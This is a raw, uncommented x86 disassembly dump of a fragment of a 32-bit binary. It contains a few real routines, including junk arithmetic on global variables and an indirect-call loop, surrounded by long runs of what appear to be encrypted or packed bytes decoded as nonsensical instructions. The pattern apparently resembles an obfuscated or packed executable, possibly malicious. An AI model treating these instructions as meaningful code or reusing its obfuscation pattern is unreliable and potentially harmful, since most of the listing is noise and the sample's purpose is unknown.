  4099a9:	fdiv   DWORD PTR [ebx-0x5c94ad42]
  4099af:	test   DWORD PTR [eax+0x613dfa2c],eax
  4099b5:	repz div DWORD PTR [edx+0x6f39c39f]
  4099bc:	jg     0x409987
  4099be:	cli    
  4099bf:	push   ebx
  4099c0:	xor    BYTE PTR [edi+0x1],dl
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e09c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e217
  4099eb:	mov    edi,DWORD PTR ds:0x42e227
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e71c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e0a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fc79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e09c
  409a3d:	sbb    DWORD PTR ds:0x42e66b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	div    eax
  409a5a:	cs leave 
  409a5c:	cli    
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a0c
  409a66:	pushf  
  409a67:	mov    eax,ds:0x4e7e9759
  409a6c:	add    al,0x7
  409a6e:	and    DWORD PTR [ecx-0x1d0da187],eax
  409a74:	test   eax,0xc7273f35
  409a79:	push   ds
  409a7a:	xchg   DWORD PTR [ecx-0x6cf5a18],ebp
  409a80:	jl     0x409a4d
  409a82:	pushf  
  409a83:	cmp    al,0x2
  409a85:	mov    ebp,0xb0f31c92
  409a8a:	fst    DWORD PTR [edi]
  409a8c:	ret    0xac9b
  409a8f:	sbb    DWORD PTR [eax+ebp*8-0x52],ebx
  409a93:	jb     0x409af8
  409a95:	jmp    0x764b:0xb3cb7379
  409a9c:	(bad)  
  409a9e:	inc    edi
  409a9f:	out    0x58,al
  409aa1:	push   ebp
  409aa2:	sbb    BYTE PTR [ebx-0x1469da11],dh
  409aa8:	add    ah,ah
  409aaa:	mov    bl,0x40
  409aac:	out    0x1b,al
  409aae:	(bad)  
  409ab0:	out    0x76,al
  409ab2:	sub    eax,0xe5fe53dc
  409ab7:	fisttp WORD PTR [esi+ebp*4-0x62]
  409abb:	mov    es,WORD PTR [eax+0x31]
  409abe:	mov    bl,0x3
  409ac0:	xor    eax,0x56838e11
  409ac5:	sub    dh,BYTE PTR [ecx+0x6c3c35f0]
  409acb:	jae    0x409ab2
  409acd:	scas   eax,DWORD PTR es:[edi]
  409ace:	pop    edx
  409acf:	jae    0x409a8e
  409ad1:	in     eax,dx
  409ad2:	xchg   edi,eax
  409ad3:	lahf   
  409ad4:	in     eax,0x5
  409ad6:	inc    ecx
  409ad7:	mov    cl,0xba
  409ad9:	pop    edx
  409ada:	add    al,0xa1
  409adc:	or     esi,0x1d
  409adf:	hlt    
  409ae0:	imul   BYTE PTR [ecx-0x3b79818f]
  409ae6:	inc    ebp
  409ae7:	inc    ebx
  409ae8:	xchg   DWORD PTR [edi+ecx*1],edi
  409aeb:	movq   QWORD PTR [edi+0x6e52c023],mm6
  409af2:	add    edi,DWORD PTR fs:[ebp+0x3c]
  409af6:	dec    edi
  409af7:	mov    ebp,DWORD PTR [edi+ebx*8+0x3af03856]
  409afe:	sub    DWORD PTR [ebx+0x14],esi
  409b01:	popf   
  409b02:	fwait
  409b03:	and    ebx,DWORD PTR [ebp-0x829f2d6]
  409b09:	mov    ah,0xf2
  409b0b:	int    0xa9
  409b0d:	mov    edx,0x7b7892ce
  409b12:	xchg   esp,eax
  409b13:	dec    ebx
  409b14:	and    cl,ah
  409b16:	push   ss
  409b17:	adc    esi,DWORD PTR [eax]
  409b19:	pop    edx
  409b1a:	rcr    BYTE PTR [ebp-0x453af863],0x1a
  409b21:	outs   dx,DWORD PTR ds:[esi]
  409b22:	xchg   esp,eax
  409b23:	mov    dh,0x91
  409b25:	pop    es
  409b26:	mov    cl,0x83
  409b28:	out    0x77,al
  409b2a:	jae    0x409b94
  409b2c:	mov    esp,0x7877993b
  409b31:	pop    ebx
  409b32:	mov    ebp,0x49b7b03
  409b37:	(bad)  
  409b38:	repnz mov eax,0x3f1da1e2
  409b3e:	cld    
  409b3f:	jnp    0x409b44
  409b41:	mov    eax,ds:0x9d44768b
  409b46:	mov    edi,0x2ffb43d5
  409b4b:	sbb    bl,BYTE PTR [edi]
  409b4d:	(bad)  
  409b4e:	pop    edx
  409b4f:	dec    eax
  409b50:	ret    
  409b51:	pop    es
  409b52:	xor    al,0xcd
  409b54:	mov    bl,BYTE PTR [ebp-0x38e67947]
  409b5a:	pop    ds
  409b5b:	shr    ch,1
  409b5d:	jmp    0x7b3e:0x3bb5083a
  409b64:	add    al,0x46
  409b66:	loope  0x409ba4
  409b68:	mov    ch,0x4c
  409b6a:	call   0x5c85:0xd5f429c5
  409b71:	mov    ebx,DWORD PTR [edx]
  409b73:	ins    DWORD PTR es:[edi],dx
  409b74:	divps  xmm2,XMMWORD PTR [eax+0x23]
  409b78:	push   ss
  409b79:	into   
  409b7a:	push   ebp
  409b7b:	mov    ch,0x40
  409b7d:	add    esi,DWORD PTR [ebp+0x12f6f558]
  409b83:	test   al,0xd4
  409b85:	add    dl,BYTE PTR [ebx-0x66fee3d2]
  409b8b:	adc    eax,0xb2c72ce9
  409b90:	daa    
  409b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b92:	cli    
  409b93:	idiv   edx
  409b95:	js     0x409b75
  409b97:	int    0x9d
  409b99:	(bad)  
  409b9a:	(bad)  
  409b9b:	leave  
  409b9c:	dec    esi
  409b9d:	add    esi,ebp
  409b9f:	push   ecx
  409ba0:	shl    DWORD PTR [eax+0x23],cl
  409ba3:	in     eax,0x53
  409ba5:	ret    0x9cb7
  409ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ba9:	ins    BYTE PTR es:[edi],dx
  409baa:	mov    DWORD PTR [ebx+esi*2+0x7d57860e],edx
  409bb1:	xor    cl,BYTE PTR [edx+0x22]
  409bb4:	push   0x4f41a1f3
  409bb9:	lahf   
  409bba:	sub    DWORD PTR [esp+esi*4],ecx
  409bbd:	push   edx
  409bbe:	lahf   
  409bbf:	adc    ch,BYTE PTR [eax+edx*8]
  409bc2:	mov    dl,0x92
  409bc4:	ins    BYTE PTR es:[edi],dx
  409bc5:	sub    esi,ebp
  409bc7:	ds push ebp
  409bc9:	jmp    0x1362cc6c
  409bce:	loop   0x409c29
  409bd0:	mov    eax,0xbf321683
  409bd5:	mov    dh,0x46
  409bd7:	add    BYTE PTR [ecx+0x752795ac],al
  409bdd:	xor    DWORD PTR [ebx-0x75],0x57403a2a
  409be4:	ins    DWORD PTR es:[edi],dx
  409be5:	push   0x1ac86ee7
  409bea:	test   BYTE PTR [edi+0x4bd8ade7],0x87
  409bf1:	iret   
  409bf2:	fs cs aam 0xab
  409bf6:	sub    BYTE PTR [eax],0x7c
  409bf9:	rcr    BYTE PTR [edi+0x47],cl
  409bfc:	dec    esi
  409bfd:	mov    ch,0x10
  409bff:	mov    cl,0x56
  409c01:	pop    edi
  409c02:	cmc    
  409c03:	mov    fs,esi
  409c05:	mov    ah,cl
  409c07:	(bad)  
  409c08:	and    DWORD PTR [ebx+0x6c],0x999ab6f7
  409c0f:	push   edi
  409c10:	jp     0x409c2a
  409c12:	jge    0x409b99
  409c14:	jnp    0x409c57
  409c16:	sbb    al,0xf4
  409c18:	pop    esp
  409c19:	icebp  
  409c1a:	inc    edi
  409c1b:	push   cs
  409c1c:	or     BYTE PTR [ebp+0x52097135],0xfb
  409c23:	fld    TBYTE PTR [ecx-0x72]
  409c26:	rol    DWORD PTR [ecx+ebx*1],1
  409c29:	dec    esi
  409c2a:	push   edi
  409c2b:	push   ecx
  409c2c:	xchg   edi,eax
  409c2d:	jb     0x409c01
  409c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c30:	stos   BYTE PTR es:[edi],al
  409c31:	retf   
  409c32:	sbb    eax,0xbf16c88f
  409c37:	in     eax,dx
  409c38:	push   esp
  409c39:	inc    ecx
  409c3a:	push   ss
  409c3b:	jmp    0xbaac:0x62f289fa
  409c42:	mov    ecx,0x85148eb3
  409c47:	sbb    al,0xa6
  409c49:	and    cl,BYTE PTR [ecx-0x6e]
  409c4c:	aaa    
  409c4d:	lahf   
  409c4e:	jnp    0x409c0a
  409c50:	and    eax,0x24bfd65
  409c55:	sahf   
  409c56:	pop    esp
  409c57:	xchg   ebp,eax
  409c58:	test   BYTE PTR [edi-0x28f6adab],cl
  409c5e:	mov    ds:0x7403878a,al
  409c63:	jp     0x409c5d
  409c65:	aaa    
  409c66:	test   al,0x59
  409c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c69:	cmp    DWORD PTR [esi+0x14],0xe70569ed
  409c70:	sbb    DWORD PTR [ecx+0x79d2e53b],edx
  409c76:	repz mov al,ds:0x43b4e45b
  409c7c:	ror    BYTE PTR [ebx],cl
  409c7e:	mov    esi,0x7f92c86b
  409c83:	xor    ecx,DWORD PTR [eax+0x68]
  409c86:	gs imul ebx,edx,0x68
  409c8a:	sbb    DWORD PTR [edi-0x68],ebp
  409c8d:	clc    
  409c8e:	stos   BYTE PTR es:[edi],al
  409c8f:	sbb    DWORD PTR [edx],esp
  409c91:	xchg   esp,eax
  409c92:	cmp    eax,0x42f167e7
  409c97:	arpl   WORD PTR [edi+0x2d],bx
  409c9a:	mov    bl,0x32
  409c9c:	daa    
  409c9d:	or     DWORD PTR [esp+eax*2+0x595a3b5a],esi
  409ca4:	mov    dl,0x7a
  409ca6:	adc    al,0xda
  409ca8:	arpl   WORD PTR [ebp+ebx*1-0x1681cb18],ax
  409caf:	push   ds
  409cb0:	dec    esp
  409cb1:	and    al,0x42
  409cb3:	lock sbb BYTE PTR [edi+edi*2+0x33],0x96
  409cb9:	jnp    0x409c5e
  409cbb:	fs test dh,bl
  409cbe:	je     0x409cce
  409cc0:	mov    ch,BYTE PTR ds:0x663a5711
  409cc6:	adc    al,0xb
  409cc8:	jnp    0x409d04
  409cca:	or     ecx,DWORD PTR [ebx]
  409ccc:	pop    ds
  409ccd:	mov    al,BYTE PTR [eax]
  409ccf:	loopne 0x409d11
  409cd1:	ror    DWORD PTR [ecx-0x6e],0x4f
  409cd5:	sbb    eax,0xd4c89230
  409cda:	dec    ecx
  409cdb:	ss in  ax,0x73
  409cdf:	fs mov dh,bl
  409ce2:	xor    BYTE PTR [edx+0x8c41cbe],dh
  409ce8:	mov    dl,0x3b
  409cea:	or     eax,0x3cd49830
  409cef:	pop    edx
  409cf0:	cmp    DWORD PTR [edx-0x4f],esi
  409cf3:	dec    edx
  409cf4:	sti    
  409cf5:	fs dec edi
  409cf7:	add    al,0xfc
  409cf9:	jecxz  0x409cd4
  409cfb:	cmp    BYTE PTR [eax+0x7f651fca],al
  409d01:	fild   DWORD PTR [edi]
  409d03:	mov    esi,0xf65ed585
  409d08:	jmp    0x3d77a0c3
  409d0d:	push   ds
  409d0e:	(bad)  
  409d0f:	(bad)  
  409d10:	ins    BYTE PTR es:[edi],dx
  409d11:	out    0x85,al
  409d13:	repnz repz sub eax,0x5490ab2e
  409d1a:	sbb    ch,BYTE PTR [edi]
  409d1c:	dec    esi
  409d1d:	dec    esp
  409d1e:	pop    ebx
  409d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d20:	adc    al,0x5e
  409d22:	loope  0x409d8e
  409d24:	js     0x409d70
  409d26:	iret   
  409d27:	or     bl,BYTE PTR [esi-0x43386b05]
  409d2d:	call   0xf851:0xb0f85957
  409d34:	xor    dl,bh
  409d36:	push   ds
  409d37:	push   es
  409d38:	in     al,dx
  409d39:	xor    al,BYTE PTR [edi-0x3]
  409d3c:	sbb    al,0xc2
  409d3e:	mov    bl,BYTE PTR [edi]
  409d40:	add    edx,DWORD PTR [ecx+0x1e74017]
  409d46:	pop    esi
  409d47:	cmp    eax,0x57f64980
  409d4c:	test   DWORD PTR [edi],edi
  409d4e:	pop    ss
  409d4f:	jp     0x409da6
  409d51:	data16 or BYTE PTR [ebx+0x27],ch
  409d55:	sbb    ebp,DWORD PTR [ebp-0x641c612]
  409d5b:	xchg   edi,eax
  409d5c:	xlat   BYTE PTR ds:[ebx]
  409d5d:	mov    dh,dh
  409d5f:	add    edx,esp
  409d61:	sub    DWORD PTR [eax+0x49],esp
  409d64:	test   DWORD PTR ss:[eax+ebx*1],0xf2b4ae54
  409d6c:	adc    DWORD PTR [eax-0x6f],esp
  409d6f:	or     ah,BYTE PTR [ecx]
  409d71:	xor    eax,0x68a4178e
  409d76:	xchg   edx,eax
  409d77:	test   DWORD PTR [ecx+0x14212a13],ebp
  409d7d:	cmp    dl,BYTE PTR [ebx]
  409d7f:	pop    ecx
  409d80:	int3   
  409d81:	add    eax,0xc1ce2ae1
  409d86:	push   esp
  409d87:	and    al,0x8
  409d89:	mov    ds:0x6b53eb8e,eax
  409d8e:	pop    ebp
  409d8f:	(bad)  
  409d91:	xor    DWORD PTR [ecx],eax
  409d93:	lahf   
  409d94:	ret    0xc4b
  409d97:	retf   0x8a6c
  409d9a:	clc    
  409d9b:	fwait
  409d9c:	and    eax,0xbdc5d1c4
  409da1:	shl    cl,1
  409da3:	xor    ch,ah
  409da5:	inc    ecx
  409da6:	inc    esp
  409da7:	mov    cl,0x53
  409da9:	add    dl,BYTE PTR [ecx-0x43]
  409dac:	jno    0x409dc0
  409dae:	inc    ecx
  409daf:	xor    eax,0xa3ac37b4
  409db4:	fwait
  409db5:	jmp    0x9292:0xb7dd1cbd
  409dbc:	or     BYTE PTR [ebx+0x50],0x71
  409dc0:	cmp    DWORD PTR [ebp-0x3fee43a5],0xb6a44a9d
  409dca:	shl    DWORD PTR [ecx],cl
  409dcc:	iret   
  409dcd:	je     0x409de4
  409dcf:	jmp    0x6b14:0x99a54b9
  409dd6:	outs   dx,DWORD PTR ds:[esi]
  409dd7:	pop    ss
  409dd8:	scas   al,BYTE PTR es:[edi]
  409dd9:	push   cs
  409dda:	inc    edi
  409ddb:	mov    DWORD PTR [esi-0x3c],esp
  409dde:	imul   esp,DWORD PTR [ebp-0x73],0xe413a75
  409de5:	xchg   esp,eax
  409de6:	out    0x39,eax
  409de8:	int3   
  409de9:	jno    0x409ded
  409deb:	xchg   ebx,eax
  409dec:	dec    edx
  409ded:	fisttp DWORD PTR [edx+0x29]
  409df0:	and    al,0x15
  409df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409df3:	shr    BYTE PTR [esi],cl
  409df5:	cs dec esi
  409df7:	scas   al,BYTE PTR es:[edi]
  409df8:	fstp   TBYTE PTR [ecx+0x6d4e5f3d]
  409dfe:	jb     0x409e61
  409e00:	int    0xc1
  409e02:	ds pop edi
  409e04:	pop    eax
  409e05:	lea    eax,[ebx]
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fd0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fc79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e0a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e263
  409e51:	mov    edi,DWORD PTR ds:0x42fd02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e683,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	cmp    DWORD PTR [ecx-0x28],esp
  409e84:	sti    
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	mov    cl,0x89
  409e8f:	pop    esp
  409e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e91:	cmp    bh,BYTE PTR [edx+0x91fd02e]
  409e97:	sub    ch,ch
  409e99:	add    eax,0x725348ef
  409e9e:	clc    
  409e9f:	xchg   ebx,eax
  409ea0:	sub    ah,dh
  409ea2:	outs   dx,BYTE PTR ds:[esi]
  409ea3:	add    edx,DWORD PTR [edi]
  409ea5:	lahf   
  409ea6:	cmc    
  409ea7:	mov    dh,0xbc
  409ea9:	fmul   st,st(5)
  409eab:	jle    0x409ece
  409ead:	mov    ebx,0x331fe679
  409eb2:	(bad)  
  409eb3:	mov    cl,0x68
  409eb5:	push   esp
  409eb6:	sub    DWORD PTR [edx],edi
  409eb8:	push   ds
  409eb9:	sub    bh,ch
  409ebb:	push   es
  409ebc:	aaa    
  409ebd:	dec    edi
  409ebe:	ret    
  409ebf:	pop    es
  409ec0:	and    ah,BYTE PTR [ebx]
  409ec2:	adc    ebx,DWORD PTR [edx-0xd327b10]
  409ec8:	aad    0x30
  409eca:	mov    edi,DWORD PTR [esi+0x58d7c594]
  409ed0:	xchg   esi,eax
  409ed1:	out    0x8a,eax
  409ed3:	in     al,dx
  409ed4:	addr16 dec edi
  409ed6:	mov    ebx,0xdaf3180a
  409edb:	pop    es
  409edc:	push   0x6a547031
  409ee1:	pop    ebx
  409ee2:	xchg   dh,ah
  409ee4:	call   0xbdaafb95
  409ee9:	mov    DWORD PTR [esi+0x4b],ebp
  409eec:	imul   esi,eax,0xffffffc9
  409eef:	retf   
  409ef0:	push   cs
  409ef1:	js     0x409edf
  409ef3:	(bad)  
  409ef4:	adc    BYTE PTR [ecx+ebp*8-0x6786fac8],ah
  409efb:	dec    esi
  409efc:	ror    BYTE PTR [eax+eax*1+0x52fcad4a],0xdd
  409f04:	ss mov DWORD PTR gs:[edx-0x6d3d6a04],0x58500047
  409f10:	inc    edx
  409f11:	ja     0x409f79
  409f13:	cmp    eax,0x22f7ad34
  409f18:	sbb    BYTE PTR gs:[eax+ebx*4-0x45],al
  409f1d:	fisubr WORD PTR [edx+0x2a81e0ed]
  409f23:	xor    al,0x29
  409f25:	aam    0xcd
  409f27:	mov    ds:0xa1788840,eax
  409f2c:	enter  0x90f2,0x2d
  409f30:	lods   al,BYTE PTR ds:[esi]
  409f31:	(bad)  
  409f32:	fcom   DWORD PTR [ecx-0x2c8aaf4c]
  409f38:	js     0x409f55
  409f3a:	sbb    edx,ecx
  409f3c:	and    BYTE PTR [esi+0x12],dh
  409f3f:	and    esp,DWORD PTR [ebp-0x10]
  409f42:	(bad)  
  409f43:	cld    
  409f44:	(bad)  
  409f45:	cmp    al,0x9e
  409f47:	inc    edx
  409f48:	sub    BYTE PTR [ebp+0x2b],al
  409f4b:	push   0x5c
  409f4d:	jge    0x409f8a
  409f4f:	sbb    al,0x1c
  409f51:	data16 ffree st(0)
  409f54:	sub    cl,BYTE PTR [esi+edi*2+0x1075f370]
  409f5b:	inc    ebx
  409f5c:	fucomp st(4)
  409f5e:	cmp    cl,BYTE PTR [ebp-0x77]
  409f61:	sub    DWORD PTR [ecx-0x17],edx
  409f64:	in     eax,dx
  409f65:	in     eax,dx
  409f66:	add    ah,ah
  409f68:	mov    BYTE PTR ds:0x9d033aa2,0x36
  409f6f:	cmp    DWORD PTR [ebp+0x5a196e1a],ebp
  409f75:	cmp    esi,eax
  409f77:	lods   al,BYTE PTR ds:[esi]
  409f78:	xor    eax,0x1032a9d9
  409f7d:	std    
  409f7e:	xor    esp,edi
  409f80:	dec    ecx
  409f81:	mov    al,0xbe
  409f83:	add    al,0x95
  409f85:	mov    edx,fs
  409f87:	sahf   
  409f88:	pop    ss
  409f89:	cmp    eax,0xa720a7a2
  409f8e:	gs sub ebp,esi
  409f91:	aam    0xbe
  409f93:	(bad)  
  409f94:	clc    
  409f95:	gs jmp 0x409f78
  409f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f99:	sub    DWORD PTR [esi],0x5ff2f14e
  409f9f:	push   ebp
  409fa0:	push   ecx
  409fa1:	(bad)  
  409fa2:	pop    esi
  409fa3:	and    dl,BYTE PTR [eax+0x57ecffa1]
  409fa9:	es adc eax,esi
  409fac:	mov    dl,0x75
  409fae:	or     esi,DWORD PTR [edi]
  409fb0:	inc    ebp
  409fb1:	cld    
  409fb2:	fiadd  DWORD PTR [edx-0x74]
  409fb5:	in     al,dx
  409fb6:	jnp    0x40a009
  409fb8:	int3   
  409fb9:	test   al,0x9e
  409fbb:	or     dh,BYTE PTR [edi]
  409fbd:	test   al,0x46
  409fbf:	into   
  409fc0:	inc    esi
  409fc1:	push   edi
  409fc2:	xchg   edx,eax
  409fc3:	and    al,0xa4
  409fc5:	adc    ecx,DWORD PTR [edx-0x2f]
  409fc8:	sub    al,0xde
  409fca:	outs   dx,BYTE PTR ds:[esi]
  409fcb:	cmp    bl,BYTE PTR gs:[edx+0x6a]
  409fcf:	cli    
  409fd0:	cmc    
  409fd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd2:	xchg   esp,eax
  409fd3:	jne    0x409f79
  409fd5:	in     al,0xce
  409fd7:	pop    ax
  409fd9:	in     eax,dx
  409fda:	mov    bh,0x96
  409fdc:	mov    al,0x25
  409fde:	mov    al,ds:0x7b3acc18
  409fe3:	lahf   
  409fe4:	pop    ss
  409fe5:	push   ebx
  409fe6:	dec    esi
  409fe7:	push   ds
  409fe8:	jne    0x409f6f
  409fea:	cmp    DWORD PTR [esi+0x53],esp
  409fed:	push   edi
  409fee:	mov    edi,0xb230ee94
  409ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff4:	xor    esi,DWORD PTR [ebp+0x668039e7]
  409ffa:	pop    esp
  409ffb:	lods   eax,DWORD PTR ds:[esi]
  409ffc:	pop    esi
  409ffd:	out    0xea,al
  409fff:	sbb    cl,BYTE PTR [esi]
  40a001:	pop    ds
  40a002:	(bad)  
  40a004:	(bad)  
  40a005:	cmp    al,0x74
  40a007:	ja     0x409ffa
  40a009:	idiv   DWORD PTR ds:0xc23a2664
  40a00f:	inc    ebp
  40a010:	out    dx,al
  40a011:	stc    
  40a012:	ret    
  40a013:	icebp  
  40a014:	cdq    
  40a015:	popf   
  40a016:	xchg   DWORD PTR [ebx],ecx
  40a018:	mov    ss,edi
  40a01a:	rcl    dl,cl
  40a01c:	and    bh,BYTE PTR [eax+0x48]
  40a01f:	scas   al,BYTE PTR es:[edi]
  40a020:	enter  0x77cf,0xe7
  40a024:	xor    al,al
  40a026:	inc    DWORD PTR [ecx+eiz*1-0x76dee6a5]
  40a02d:	xor    edx,DWORD PTR [edx+0x23]
  40a030:	lods   al,BYTE PTR ds:[esi]
  40a031:	add    bl,BYTE PTR [edx-0x77]
  40a034:	inc    eax
  40a035:	shr    BYTE PTR [esi-0x745528c4],0x97
  40a03c:	lock repz dec ebx
  40a03f:	clc    
  40a040:	jae    0x40a037
  40a042:	jecxz  0x409fca
  40a044:	(bad)  
  40a045:	jns    0x40a007
  40a047:	fst    st(1)
  40a049:	shl    BYTE PTR [ebx-0x53],1
  40a04c:	cmp    bl,BYTE PTR [eax-0x43]
  40a04f:	aad    0x45
  40a051:	mov    ebx,0x380c9c48
  40a056:	and    ah,BYTE PTR [ebp-0x6b]
  40a059:	xor    eax,0x73a1460c
  40a05e:	loop   0x40a0a4
  40a060:	ja     0x40a0aa
  40a062:	adc    eax,ecx
  40a064:	out    dx,eax
  40a065:	sub    eax,0xa1f3c293
  40a06a:	(bad)  
  40a06b:	jae    0x40a06e
  40a06d:	push   ebp
  40a06e:	xor    BYTE PTR [eax+0x7a],al
  40a071:	retf   0x7d84
  40a074:	adc    eax,0xd91eb822
  40a079:	les    esp,FWORD PTR [esi-0x25d0b45a]
  40a07f:	jns    0x40a05e
  40a081:	fsubr  DWORD PTR [edi]
  40a083:	fcom   DWORD PTR [ecx-0x2]
  40a086:	call   0xa261:0xbb92a11b
  40a08d:	xchg   ebp,eax
  40a08e:	je     0x40a0d4
  40a090:	mov    esp,0x473c3d6d
  40a095:	mov    esp,0x1a92649
  40a09a:	les    edx,FWORD PTR [ebp-0xcf0c3ce]
  40a0a0:	jne    0x40a052
  40a0a2:	cmp    DWORD PTR [ecx+0xa6722d8],edi
  40a0a8:	dec    edx
  40a0a9:	mov    al,ah
  40a0ab:	mov    bh,BYTE PTR [edx]
  40a0ad:	fwait
  40a0ae:	test   al,0x62
  40a0b0:	xor    DWORD PTR [eax+0x25],ebx
  40a0b3:	mov    ebx,0x3b6febf1
  40a0b8:	imul   eax,DWORD PTR [edi],0x5c
  40a0bb:	xchg   DWORD PTR [edi-0x16],esp
  40a0be:	ret    0xa5b7
  40a0c1:	mov    ds:0x16623615,eax
  40a0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c7:	mov    ?,WORD PTR [edi+0x73]
  40a0ca:	dec    eax
  40a0cb:	(bad)  
  40a0cc:	out    dx,al
  40a0cd:	daa    
  40a0ce:	or     al,0x12
  40a0d0:	jle    0x40a07b
  40a0d2:	rcl    DWORD PTR [edx+0x33],0xf4
  40a0d6:	(bad)
  40a0da:	stos   BYTE PTR es:[edi],al
  40a0db:	ret    
  40a0dc:	pop    ebx
  40a0dd:	jle    0x40a0db
  40a0df:	xchg   edx,eax
  40a0e0:	sti    
  40a0e1:	daa    
  40a0e2:	xor    BYTE PTR [esi+0x74],bh
  40a0e5:	iret   
  40a0e6:	ss mov ebx,0xa2c2e905
  40a0ec:	ret    0x3bdf
  40a0ef:	inc    eax
  40a0f0:	out    dx,al
  40a0f1:	jp     0x40a147
  40a0f3:	in     eax,0xc6
  40a0f5:	xor    eax,0x33510f9f
  40a0fa:	pop    es
  40a0fb:	stos   BYTE PTR es:[edi],al
  40a0fc:	inc    edx
  40a0fd:	add    ebp,DWORD PTR [ebx-0x7ba08b17]
  40a103:	push   esi
  40a104:	test   eax,0xa3cdce15
  40a109:	inc    ecx
  40a10a:	mov    eax,0x57fd230a
  40a10f:	(bad)  [ebx-0x13]
  40a112:	pop    eax
  40a113:	clc    
  40a114:	shl    BYTE PTR [edx+0x534fe855],0x7b
  40a11b:	je     0x40a0a3
  40a11d:	sub    DWORD PTR [ebp+0x6c],ebp
  40a120:	pop    ss
  40a121:	jae    0x40a0e4
  40a123:	inc    edx
  40a124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a125:	mov    ecx,0x8a32dfa5
  40a12a:	adc    BYTE PTR [bp+di],al
  40a12d:	in     eax,0x50
  40a12f:	xor    edi,DWORD PTR [ebx-0x2bcef538]
  40a135:	pop    ecx
  40a136:	push   ebp
  40a137:	xor    DWORD PTR [esi],edx
  40a139:	jno    0x40a187
  40a13b:	adc    ebx,ecx
  40a13d:	loopne 0x40a170
  40a13f:	fst    QWORD PTR [eax+0x67c89f95]
  40a145:	xor    cl,BYTE PTR [edx+0x7e]
  40a148:	xor    cl,cl
  40a14a:	xor    eax,0x50e1a50f
  40a14f:	fistp  QWORD PTR [edx-0x2f516689]
  40a155:	mov    ecx,DWORD PTR [edi+ecx*1+0x78]
  40a159:	lea    esi,ds:0x13f17e7c
  40a15f:	push   eax
  40a160:	mov    ebp,DWORD PTR [edi]
  40a162:	gs jns 0x40a1c6
  40a165:	cli    
  40a166:	mov    al,0xc0
  40a168:	call   0xe586cc77
  40a16d:	clc    
  40a16e:	shr    DWORD PTR [ecx+ebp*8+0x12],1
  40a172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a173:	jne    0x40a1a3
  40a175:	sub    DWORD PTR [esp+ebp*4+0x4a9615c8],0xf9d0b959
  40a180:	in     eax,0x7f
  40a182:	xor    eax,0xecbc8fc2
  40a187:	popf   
  40a188:	fcomi  st,st(2)
  40a18a:	call   0x852d396d
  40a18f:	sbb    DWORD PTR [ebx],esi
  40a191:	test   eax,0x94b12a8
  40a196:	loop   0x40a198
  40a198:	in     eax,dx
  40a199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a19a:	xchg   bp,ax
  40a19c:	test   DWORD PTR [eax+0x70],eax
  40a19f:	addr16 shr al,cl
  40a1a2:	dec    esi
  40a1a3:	or     al,0x3
